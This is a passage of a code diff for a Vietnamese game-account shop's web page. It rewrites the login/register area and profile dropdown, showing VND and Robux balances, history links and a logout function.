-                            <img src="https://tse2.mm.bing.net/th/id/OIP.vg41yG82qw84ziz5nS-CWQHaHa?pid=Api&P=0&h=180"> ${u} ▼
+                    ${adminButtonHtml}
+                    <div class="dropdown" onclick="toggleDropdown()">
+                        <button class="profile-btn">
+                            <img src="${avatarUrl}" alt="Avatar">
+                            ${user.username}
+                            <span class="dropdown-arrow">&#9660;</span>
                         </button>
-                        <div class="dropdown-content" id="pDrop">
-                            <div class="dropdown-header">Ví: ${user.balance.toLocaleString()}đ</div>
-                            <a href="taikhoan.html">Quản lý</a>
-                            <a href="#" onclick="localStorage.clear(); location.reload()">Đăng xuất</a>
+                        <div class="dropdown-content" id="profileDropdown">
+                            <div class="dropdown-header">
+                                Số dư: ${user.balance.toLocaleString('vi-VN')} VND 
+                                <br>
+                                Robux: ${(user.robuxBalance || 0).toLocaleString('vi-VN')} 💎
+                            </div>
+                            <a href="taikhoan.html" class="red-text">Quản lý tài khoản</a>
+                            <a href="taikhoan.html#lichsunap">Lịch sử nạp tiền</a>
+                            <a href="taikhoan.html#lichsumua">Lịch sử mua nick</a>
+                            <a href="taikhoan.html#lichsudv">Lịch sử dịch vụ</a>
+                            <a href="taikhoan.html#lichsuquay">Lịch sử quay</a>
+                            <div class="dropdown-separator"></div>
+                            <a href="#" onclick="logout()">Đăng xuất</a>
                         </div>
-                    </div>`;
+                    </div>
+                `;
+            } else {
+                area.innerHTML = `
+                    <div class="icon-text" onclick="showAuthPrompt()">
+                        <img src="https://img.icons8.com/ios-filled/50/000000/user--v1.png" alt="User Icon"> Đăng nhập
+                    </div>
+                    <div class="icon-text" onclick="showAuthPrompt()">
+                        <img src="https://img.icons8.com/ios-filled/50/000000/add-user-male--v1.png" alt="Register Icon"> Đăng ký
+                    </div>
+                `;
             }
         }
 
-        document.addEventListener('DOMContentLoaded', checkLoginStatus);
-        
+        function toggleDropdown() {
+            document.getElementById("profileDropdown").classList.toggle("show");
+        }
+
         window.onclick = function(event) {
-            if (!event.target.closest('.dropdown')) {
-                var dropdowns = document.getElementsByClassName("dropdown-content");
-                for (var i = 0; i < dropdowns.length; i++) {
-                    var openDropdown = dropdowns[i];
+            // Đóng dropdown menu nếu click ra ngoài
+            if (!event.target.matches('.profile-btn') && !event.target.closest('.profile-btn')) {
+                const dropdowns = document.getElementsByClassName("dropdown-content");
+                for (let i = 0; i < dropdowns.length; i++) {
+                    const openDropdown = dropdowns[i];
                     if (openDropdown.classList.contains('show')) {
                         openDropdown.classList.remove('show');
                     }
                 }
             }
         }
+
+        function logout() {
+            localStorage.removeItem('currentUser');
+            showCustomAlert("Đăng xuất", "Bạn đã đăng xuất thành công.");
+            window.location.reload(); 
+        }
+
+        async function checkLoginStatus() {
+            const username = localStorage.getItem('currentUser');
+            if (username) {
+                let user = await fetchUserData(username);
+                if (user) {
+                    renderAuthStatus(user);
+                    return;
+                }
+            }
+            renderAuthStatus(null);
+        }
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            checkLoginStatus(); 
+        });
     </script>
 </body>
 </html>
